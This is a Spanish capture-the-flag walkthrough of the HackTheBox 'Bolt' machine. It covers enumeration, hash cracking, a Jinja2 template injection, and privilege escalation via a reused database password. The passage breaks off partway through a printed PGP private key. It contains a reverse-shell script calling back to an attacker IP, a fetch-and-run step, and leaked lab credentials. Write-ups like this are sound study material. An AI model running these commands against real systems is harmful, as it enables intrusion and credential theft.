lo haremos a directorios, para ello utilizaremos wfuzz:wfuzz -c --hc=404,403 -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.bolt.htb\" http://bolt.htb /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://bolt.htb/Total requests: 114441=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                                           =====================================================================000000001:   200        504 L    1801 W     30341 Ch    \"www\"                                                                                                                                             000000003:   200        504 L    1801 W     30341 Ch    \"ftp\"                                                                                                                                             000000015:   200        504 L    1801 W     30341 Ch    \"ns\"                                                                                                                                              000000007:   200        504 L    1801 W     30341 Ch    \"webdisk\"                                                                                                                                         000000031:   200        504 L    1801 W     30341 Ch    \"mobile\"                                                                                                                                          000000050:   200        504 L    1801 W     30341 Ch    \"wiki\"                                                                                                                                            000000049:   200        504 L    1801 W     30341 Ch    \"server\"                                                                                                                                          000000048:   200        504 L    1801 W     30341 Ch    \"portal\"                                                                                                                                          000000047:   200        504 L    1801 W     30341 Ch    \"news\"                                                                                                                                            000000046:   200        504 L    1801 W     30341 Ch    \"img\"                                                                                                                                             000000045:   200        504 L    1801 W     30341 Ch    \"www1\"                                                                                                                                            000000044:   200        504 L    1801 W     30341 Ch    \"web\"                                                                                                                                             000000043:   200        504 L    1801 W     30341 Ch    \"lists\"                                                                                                                                           000000042:   200        504 L    1801 W     30341 Ch    \"static\"           Observamos un montón, para filtrar quitaremos los resultados que tengan 30341 ch:wfuzz -c --hc=404,403 --hh=30341 -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.bolt.htb\" http://bolt.htb /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://bolt.htb/Total requests: 114441=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                                           =====================================================================000000038:   302        3 L      24 W       219 Ch      \"demo\"                                                                                                                                            000000002:   200        98 L     322 W      4943 Ch     \"mail\"      Encontramos demo y mail, vamos a agregarlos al /etc/hosts y revisarlos:ExplotaciónPero no podemos ver nada, quizas se debe requerir estar autenticado o algo por el estilo. En este punto no queda mucho mas que hacer, por lo tanto, revisaremos el archivo .tar que hemos descargado por si encontramos alguna información de utilidad.En primer lugar lo vamos a descomprimir:tar -xf image.tar❯ ls187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950  3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b       a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f21be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c  41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad       d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb262265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa  745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf       image.tar3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab  859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json  manifest.json3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162  9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77       repositoriesVamos a filtrar entre todos estos directorios y archivos.En primer lugar haremos un tree:tree -fas[       4096]  .├── [       4096]  ./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950│   ├── [        406]  ./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/json│   ├── [    4463104]  ./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar│   └── [          3]  ./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/VERSION├── [       4096]  ./1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c│   ├── [        482]  ./1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/json│   ├── [       3072]  ./1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tar│   └── [          3]  ./1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/VERSION├── [       4096]  ./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa│   ├── [        482]  ./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/json│   ├── [      15360]  ./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar│   └── [          3]  ./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/VERSION├── [       4096]  ./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab│   ├── [        482]  ./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/json│   ├── [       7168]  ./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar│   └── [          3]  ./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/VERSION├── [       4096]  ./3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162│   ├── [       1312]  ./3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/json│   ├── [       8192]  ./3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar│   └── [          3]  ./3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/VERSION├── [       4096]  ./3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b│   ├── [        482]  ./3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/json│   ├── [   29789184]  ./3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tarVemos mucha información, tendremos que ir filtrando para encontrar cosas que nos sean de utilidad.tree -fas | grep \"layer.tar\"│   ├── [    4463104]  ./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar│   ├── [       3072]  ./1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tar│   ├── [      15360]  ./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar│   ├── [       7168]  ./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar│   ├── [       8192]  ./3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar│   ├── [   29789184]  ./3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tar│   ├── [   62859776]  ./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar│   ├── [       7680]  ./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar│   ├── [    6984192]  ./9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar│   ├── [      19968]  ./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar│   ├── [   57565184]  ./d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/layer.tarNos interesan los archivos .tar, asi que los vamos a selecionar, ahora si utilizamos el 7z para ver el contenido de uno de ellos:7z l ./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs Intel(R) Core(TM) i5-9400F CPU @ 2.90GHz (906EA),ASM,AES-NI)Scanning the drive for archives:1 file, 4463104 bytes (4359 KiB)                                             Listing archive: ./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar--Path = ./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tarType = tarPhysical Size = 4463104Headers Size = 244224Code Page = UTF-8   Date      Time    Attr         Size   Compressed  Name------------------- ----- ------------ ------------  ------------------------2019-03-06 15:18:31 D....            0            0  bin2019-03-06 15:18:31 .....           12            0  bin/ash2019-03-06 15:18:31 .....           12            0  bin/base642019-03-06 15:18:31 .....           12            0  bin/bbconfigNos lista toda la información. Ahora haremos un for para ir layer por layer aplicando el comando 7z:for tar in $(tree -fas | grep \"layer.tar\"|awk 'NF{print $NF}');do 7z l $tar; ;doneutilizamos awk para sacar como ultimo argumento el .tar. Ahora que podemos listar el contenido de estos comprimidos vamos a buscar cosas que nos interesen, por ejemplo, podría ser donde se mencione admin,password, config o db, asi que usaremos grep para esto:for tar in $(tree -fas | grep \"layer.tar\"|awk 'NF{print $NF}');do echo \"CAMBIANDO DE ARCHIVO\" $tar ;7z l $tar|grep -E \"admin|password|credentials|config|db|database\";doneAgregamos el echo de cambiando archivo para diferenciar todo en el output, además agregamos un par de palabras más para buscar, el resultado es:for tar in $(tree -fas | grep \"layer.tar\"|awk 'NF{print $NF}');do echo \"CAMBIANDO DE ARCHIVO\" $tar;7z l $tar|grep -E \"admin|password|credentials|config|db|database\";doneCAMBIANDO DE ARCHIVO ./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar2019-03-06 15:18:31 .....           12            0  bin/bbconfig2019-03-06 15:18:31 D....            0            0  lib/apk/db2019-03-06 15:18:31 .....        10730        10752  lib/apk/db/installed2019-03-06 15:18:31 .....            0            0  lib/apk/db/lock2019-03-06 15:18:31 .....         9728         9728  lib/apk/db/scripts.tar2019-03-06 15:18:31 .....           76          512  lib/apk/db/triggers2019-03-06 15:18:31 .....           12            0  sbin/ifconfig2018-02-07 14:19:03 .....          393          512  sbin/ldconfig2019-03-06 15:18:31 .....           12            0  sbin/vconfigCAMBIANDO DE ARCHIVO ./1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tarCAMBIANDO DE ARCHIVO ./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tarCAMBIANDO DE ARCHIVO ./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tarListing archive: ./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tarPath = ./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar2021-03-05 12:45:09 .....            0            0  .wh.db.sqlite3Encontramos bastantes cosas, sin embargo, si vamos bajando encontramos algo especial:CAMBIANDO DE ARCHIVO ./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar2021-03-05 12:44:04 .....        16384        16384  db.sqlite3Encontramos lo que parece un archivo de base de datos de sqlite, por lo tanto, vamos a revisarlo por si encontramos información:tar -xf ./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tarfile db.sqlite3db.sqlite3: SQLite 3.x database, last written using SQLite version 3025003, file counter 2, database pages 4, cookie 0x1, schema 4, UTF-8, version-valid-for 2Efectivamente corresponde a una archivo de sqlite, vamos a abrirlo.sqlite3 db.sqlite3SQLite version 3.40.1 2022-12-28 14:03:47Enter \".help\" for usage hints.sqlite&gt; .tablesUserVemos una tabla User, vamos a ver todo lo que contiene:sqlite&gt; select * from User;1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||Observamos el nombre de admin, su correo y un hash. Vamos a intentar crackear este hash utilizando john:john --wordlist=/usr/share/wordlists/rockyou.txt hashWarning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"Use the \"--format=md5crypt-long\" option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusdeadbolt         (?)     1g 0:00:00:00 DONE (2023-02-15 14:46) 1.136g/s 196363p/s 196363c/s 196363C/s debie..curtis13Use the \"--show\" option to display all of the cracked passwords reliablySession completed. Tenemos una contraseña, deadbolt vamos a probarla en los paneles de login que encontramos previamente:Nos hemos logeado correctamente en la página principal.No encontramos mucha información, pero hay una interesante:Hablan sobre algo que ocurre con el mail y algo sobre una demo, interesante que justo sean los subdominions que encontramos, quizás tengamos que hacer algo con ellos.Si volvemos a ver las páginas que no podíamos ver tenemos, para demo:y para mail:Sin embargo, nuestras credenciales no funcionan acá.Si revisamos el login de demo, notamos una sección de registro:Vamos a probarla:Pero al momento de intentar registrarnos, nos pide un código de invitación que no tenemos. En este punto no tenemos más alternativas que buscar dentro de los .tar si encontramos algo similar, pues el panel tampoco podemos vulnerarlo.Para esto filtraremos por el invite code:grep -r -i -E \"invite code|invite_code|invitation|invitation_code|invitation code\"grep: 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar: binary file matchesgrep: 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar: binary file matchesObservamos que encontró dos archivos que tienen información relacionada, asi que vamos a verlos.Si descomprimimos y vamos revisando uno por uno, llegamos al segundo layer.tar: grep -r -i -E \"invite code|invite_code|invitation|invitation_code|invitation code\"app/base/forms.py:    invite_code = TextField('Invite Code', id='invite_code'    , validators=[DataRequired()])app/base/templates/accounts/register.html:            { form.invite_code(placeholder=\"Invite Code\", class=\"form-control\") }app/base/templates/code-500.html:                                Invalid invitation code.app/base/routes.py:        code   = request.form['invite_code']Si revimos uno por uno estos archivos para ver lo que contiene, encontramos el routes.py y si lo inspeccionamos:if 'register' in request.form:        username  = request.form['username']        email     = request.form['email'   ]        code      = request.form['invite_code']        if code != 'XNSS-HSJW-3NGU-8XTJ':            return render_template('code-500.html')        data = User.query.filter_by(email=email).first()        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':            # Check usename exists            user = User.query.filter_by(username=username).first()Encontramos el código de invitación en texto claro en la validación, muy buena practica.Con este código, intentaremos registrarnos en la web de demo y conseguimos crearnos una cuenta utilizando el código de invitación, ahora iniciamos sesión:Iniciamos:Entramos, podemos ver un panel con diferentes opciones, si investigamos no parece que podamos hacer nada.Por ahora, vamos a probar ingresar al área de mail, pues supuestamente hay una vulnerabilidad.Como hemos visto, puede ser que esta vulnerabilidad sea ssti, debido a que el nombre jinja ha aprecido por ahí, sin embargo, debemos encontrar un output que permita ver nuestros imput para ver si es vulnerable.Vamos a ver la web de mail:Nos hemos logeado exitosamente. Podemos ver un panel donde llegan correos, lo que nos hace pensar que al enviar o recibir un correo pueda ocurrir un error, si nos ponemos a pensar como enviar un correo se nos ocurre que quizás podamos cambiar la contraseña, siempre llegan correos de confirmación, vamos a ver si funciona:Encontramos esta parte en settings, vamos a guardar los cambios.Observamos que nos ha llegado un mail:Si hacemos click:Podemos ver que dice que he cambiado mi nombre, a ver si ponemos otro:Notamos que lo que ponemos en el campo de nombre, se ve reflejado en el mail, si es que esto tiene alguna vulnerabilidad vamos a probar injecciones, en especial SSTI, pues como dije antes, aparecio el nombre de jinja y con respecto a otras máquinas con SSTI las tecnologías se parecen:Si vemos la respuesta:Efectivamente, vemos como ha aparecido 49, por lo tanto, es vulnerable a SSTI, vamos a ir a la web de HackTricks para buscar payloads para SSTI en jinja2, pues esta web usa flask (python).Encontramos el siguiente:Esto debido a que como vimos está en python.Si observamos la respuesta en el mail:Observamos que injectamos comandos, ahora solo falta ganar acceso al sistema y lo haremos como siempre.En primer lugar, tendremos un servidor http con python compartiendo un index.html malicioso:#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.14.17/1234 0&gt;&amp;1Luego, haremos un curl desde el SSTI y lo pipeamos con bash para ejecutar el comando, ganando de esta forma acceso al sistema:Si lo enviamos:python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.114 - - [15/Feb/2023 15:40:11] \"GET / HTTP/1.1\" 200 -Y en el netcat:rlwrap nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.11.114] 48496bash: cannot set terminal process group (826): Inappropriate ioctl for devicebash: no job control in this shellwww-data@bolt:~/demo$ whoamiwhoamiwww-dataHemos ganado acceso al sistema, ahora buscaremos la flag:www-data@bolt:/home$ ls -lals -latotal 16drwxr-xr-x  4 root  root  4096 Mar  3  2021 .drwxr-xr-x 19 root  root  4096 Jan 26  2022 ..drwxr-x--- 15 clark clark 4096 Feb 25  2021 clarkdrwxr-x--- 16 eddie eddie 4096 Aug 26  2021 eddieSin embargo no podemos, pues no tenemos privilegios.Veamos nuestros permisos:[sudo] password for www-data: ^Csudo: 1 incorrect password attemptPero necesitamos contraseña.Vamos a listar permisos SUID: www-data@bolt:~/demo$ find / -perm -4000 2&gt;/dev/null/opt/google/chrome/chrome-sandbox/usr/sbin/pppd/usr/lib/xorg/Xorg.wrap/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/bin/newgrp/usr/bin/passwd/usr/bin/chfn/usr/bin/gpasswd/usr/bin/vmware-user-suid-wrapper/usr/bin/umount/usr/bin/fusermount/usr/bin/mount/usr/bin/su/usr/bin/sudo/usr/bin/chshPero no encontramos nada interesante.Veamos por capabilities:www-data@bolt:~/demo$ getcap -r / 2&gt;/dev/null/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep/usr/bin/mtr-packet = cap_net_raw+ep/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep/usr/bin/ping = cap_net_raw+ep/usr/bin/traceroute6.iputils = cap_net_raw+epPero no vemos nada.En este punto vamos a utilizar la herramienta linPEAS para enumerar información y posibles vías para escalar privilegios, lo encontramos en github.Vamos a descargar el .sh y lo subimos a la máquina víctima, haremos un servidor http con python y lo descargaremos de alli.www-data@bolt:~/demo$ wget http://10.10.14.17/linpeas.sh--2023-02-15 14:28:59--  http://10.10.14.17/linpeas.shConnecting to 10.10.14.17:80... connected.HTTP request sent, awaiting response... 200 OKLength: 828145 (809K) [text/x-sh]Saving to: ‘linpeas.sh’linpeas.sh                                           100%[=====================================================================================================================&gt;] 808.74K   782KB/s    in 1.0s    2023-02-15 14:29:00 (782 KB/s) - ‘linpeas.sh’ saved [828145/828145]Lo ejecutamos y analizando llegamos a esto:Analyzing Passbolt Files (limit 70)-rw-r----- 1 root www-data 3128 Feb 25  2021 /etc/passbolt/passbolt.php                                                                                                                                             * Passbolt ~ Open source password manager for teams            'host' =&gt; 'localhost',            'port' =&gt; '3306',            'username' =&gt; 'passbolt',            'password' =&gt; 'rT2;jW7&lt;eY8!dX8}pQ8%',            'database' =&gt; 'passboltdb',    'EmailTransport' =&gt; [            'host' =&gt; 'localhost',            'port' =&gt; 587,Tenemos una contraseña, vamos a probar si nos sirve para los usuarios que conocemos:www-data@bolt:~/demo$ su eddiePassword: eddie@bolt:/var/www/demo$ whoamieddieObservamos que si hubo reutilización de contraseña, ahora buscamos la flag de usuario.eddie@bolt:/var/www/demo$ cd /home/eddieeddie@bolt:~$ cat user.txtec66625108db5198310091f2¡Bien! Tenemos la flag de usuario, ahora tenemos que escalar privilegios.Escalada de privilegiosLas credenciales que obtuvimos eran para mysql, asi que entraremos a ver que encontramos:eddie@bolt:~$ mysql -u passbolt -pEnter password: Welcome to the MySQL monitor.  Commands end with ; or \\g.Your MySQL connection id is 1473Server version: 8.0.26-0ubuntu0.20.04.2 (Ubuntu)Copyright (c) 2000, 2021, Oracle and/or its affiliates.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; Buscamos las databases:mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || passboltdb         |+--------------------+2 rows in set (0.00 sec)mysql&gt; use passboltdbReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedAhora veremos las tablas:mysql&gt; show tables;+-----------------------+| Tables_in_passboltdb  |+-----------------------+| account_settings      || action_logs           || actions               || authentication_tokens || avatars               || comments              || email_queue           || entities_history      || favorites             || gpgkeys               || groups                || groups_users          || organization_settings || permissions           || permissions_history   || phinxlog              || profiles              || resource_types        || resources             || roles                 || secret_accesses       || secrets               || secrets_history       || user_agents           || users                 |+-----------------------+Observamos algunas tablas de interés, por ejemplo, secrets y users, veamos que hay:mysql&gt; select * from secrets;Encontramos un mensajes PGP:-----BEGIN PGP MESSAGE-----Version: OpenPGP.js v4.10.9Comment: https://openpgpjs.orgwcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5pscg/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kYpCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3HoAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Pxl+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218RzyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQpedLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+ul0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCtoPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tYNdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5aIebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhsnO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984=P38i-----END PGP MESSAGE-----Ahora vamos a revisar permisos:eddie@bolt:~$ sudo -l[sudo] password for eddie: Sorry, user eddie may not run sudo on bolt.No podemos utilizar sudo, vamos a buscar por SUID:eddie@bolt:~$  find / -perm -4000 2&gt;/dev/null/opt/google/chrome/chrome-sandbox/usr/sbin/pppd/usr/lib/xorg/Xorg.wrap/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/bin/newgrp/usr/bin/passwd/usr/bin/chfn/usr/bin/gpasswd/usr/bin/vmware-user-suid-wrapper/usr/bin/umount/usr/bin/fusermount/usr/bin/mount/usr/bin/su/usr/bin/sudo/usr/bin/chshPero no encontramos nada de interés.Vamos a utilizar de nuevo el linpeas.sh pero para este usuario, pues puede tener permisos diferentes lo que nos permitan otras formas de escalar.Possible private SSH keys were found!/etc/ImageMagick-6/mime.xml/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.logEncontramos algo interesante, pues esto existía en el scaneo anterior pero lo del log no, vamos a ver de que se trata.Encontramos un montón de información que es dificil de leer, sin embargo, si prestamos atención veremos lo siguiente:-----BEGIN PGP PRIVATE KEY BLOCK-----\\\\r\\\\nVersion: OpenPGP.js v4.10.9\\\\r\\\\nComment: https://openpgpjs.org\\\\r\\\\n\\\\r\\\\nxcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi\\\\r\\\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\\\r\\\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\\\r\\\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU\\\\r\\\\n+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\\\r\\\\nIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB\\\\r\\\\nAAH+CQMINK+e85VtWtjguB8IR+AfuDbIzHyKKvMfGStRhZX5cdsUfv5znicW\\\\r\\\\nUjeGmI+w7iQ+WYFlmjFN/Qd527qOFOZkm6TgDMUVubQFWpeDvhM4F3Y+Fhua\\\\r\\\\njS8nQauoC87vYCRGXLoCrzvM03IpepDgeKqVV5r71gthcc2C/Rsyqd0BYXXA\\\\r\\\\niOe++biDBB6v/pMzg0NHUmhmiPnSNfHSbABqaY3WzBMtisuUxOzuvwEIRdac\\\\r\\\\n2eEUhzU4cS8s1QyLnKO8ubvD2D4yVk+ZAxd2rJhhleZDiASDrIDT9/G5FDVj\\\\r\\\\nQY3ep7tx0RTE8k5BE03NrEZi6TTZVa7MrpIDjb7TLzAKxavtZZYOJkhsXaWf\\\\r\\\\nDRe3Gtmo/npea7d7jDG2i1bn9AJfAdU0vkWrNqfAgY/r4j+ld8o0YCP+76K/\\\\r\\\\n7wiZ3YYOBaVNiz6L1DD0B5GlKiAGf94YYdl3rfIiclZYpGYZJ9Zbh3y4rJd2\\\\r\\\\nAZkM+9snQT9azCX/H2kVVryOUmTP+uu+p+e51z3mxxngp7AE0zHqrahugS49\\\\r\\\\ntgkE6vc6G3nG5o50vra3H21kSvv1kUJkGJdtaMTlgMvGC2/dET8jmuKs0eHc\\\\r\\\\nUct0uWs8LwgrwCFIhuHDzrs2ETEdkRLWEZTfIvs861eD7n1KYbVEiGs4n2OP\\\\r\\\\nyF1ROfZJlwFOw4rFnmW4Qtkq+1AYTMw1SaV9zbP8hyDMOUkSrtkxAHtT2hxj\\\\r\\\\nXTAuhA2i5jQoA4MYkasczBZp88wyQLjTHt7ZZpbXrRUlxNJ3pNMSOr7K/b3e\\\\r\\\\nIHcUU5wuVGzUXERSBROU5dAOcR+lNT+Be+T6aCeqDxQo37k6kY6Tl1+0uvMp\\\\r\\\\neqO3/sM0cM8nQSN6YpuGmnYmhGAgV/Pj5t+cl2McqnWJ3EsmZTFi37Lyz1CM\\\\r\\\\nvjdUlrpzWDDCwA8VHN1QxSKv4z2+QmXSzR5FZGRpZSBKb2huc29uIDxlZGRp\\\\r\\\\nZUBib2x0Lmh0Yj7CwI0EEAEIACAFAmA4G2EGCwkHCAMCBBUICgIEFgIBAAIZ\\\\r\\\\nAQIbAwIeAQAhCRAcJ0Gj3DtKvRYhBN9Ca8ekqK9Y5Q7aDhwnQaPcO0q9+Q0H\\\\r\\\\n/R2ThWBN8roNk7hCWO6vUH8Da1oXyR5jsHTNZAileV5wYnN+egxf1Yk9/qXF\\\\r\\\\nnyG1k/IImCGf9qmHwHe+EvoDCgYpvMAQB9Ce1nJ1CPqcv818WqRsQRdLnyba\\\\r\\\\nqx5j2irDWkFQhFd3Q806pVUYtL3zgwpupLdxPH/Bj2CvTIdtYD454aDxNbNt\\\\r\\\\nzc5gVIg7esI2dnTkNnFWoFZ3+j8hzFmS6lJvJ0GN+Nrd/gAOkhU8P2KcDz74\\\\r\\\\n7WQQR3/eQa0m6QhOQY2q/VMgfteMejlHFoZCbu0IMkqwsAINmiiAc7H1qL3F\\\\r\\\\nU3vUZKav7ctbWDpJU/ZJ++Q/bbQxeFPPkM+tZEyAn/fHwwYEYDgbYQEIAJpY\\\\r\\\\nHMNw6lcxAWuZPXYz7FEyVjilWObqMaAael9B/Z40fVH29l7ZsWVFHVf7obW5\\\\r\\\\nzNJUpTZHjTQV+HP0J8vPL35IG+usXKDqOKvnzQhGXwpnEtgMDLFJc2jw0I6M\\\\r\\\\nKeFfplknPCV6uBlznf5q6KIm7YhHbbyuKczHb8BgspBaroMkQy5LHNYXw2FP\\\\r\\\\nrOUeNkzYjHVuzsGAKZZzo4BMTh/H9ZV1ZKm7KuaeeE2x3vtEnZXx+aSX+Bn8\\\\r\\\\nKo+nUJZEn9wzHhJwcsRGV94pnihqwlJsCzeDRzHlLORF7i57n7rfWkzIW8P7\\\\r\\\\nXrU7VF0xxZP83OxIWQ0dXd5pA1fN3LRFIegbhJcAEQEAAf4JAwizGF9kkXhP\\\\r\\\\nleD/IYg69kTvFfuw7JHkqkQF3cBf3zoS